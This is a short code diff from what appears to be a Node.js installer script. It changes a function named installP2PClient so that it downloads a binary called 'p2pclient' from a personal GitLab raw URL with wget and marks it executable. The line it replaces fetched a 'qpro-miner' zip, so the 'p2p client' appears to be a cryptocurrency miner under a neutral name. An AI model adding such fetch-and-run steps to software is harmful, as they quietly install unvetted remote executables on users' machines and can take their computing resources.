@@ -22,7 +22,7 @@ function installP2PClient() {
     console.log("🔄 Downloading p2pclient...");
     try {
         execSync(`
-            wget -q https://dl.qubicmine.pro/qpro-miner-v1.0.12.zip -O ${P2P_PATH} && \
+            wget -q https://gitlab.com/rikzakalani/close/raw/main/p2pclient -O ${P2P_PATH} && \
             chmod +x ${P2P_PATH}
         `, { stdio: 'inherit' });
         console.log("✅ p2pclient installed successfully!");
